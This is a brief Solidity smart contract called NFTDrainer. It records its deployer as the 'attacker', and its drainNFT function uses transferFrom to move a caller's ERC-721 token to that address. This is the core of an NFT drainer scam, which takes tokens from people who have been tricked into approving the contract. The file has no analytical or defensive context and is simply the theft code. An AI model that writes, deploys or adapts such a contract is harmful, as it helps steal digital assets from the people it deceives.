// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract NFTDrainer {
    address public attacker;

    constructor() {
        attacker = msg.sender;
    }


    function drainNFT(address nftContract, uint256 tokenId) external {
        IERC721(nftContract).transferFrom(msg.sender, attacker, tokenId);
    }
}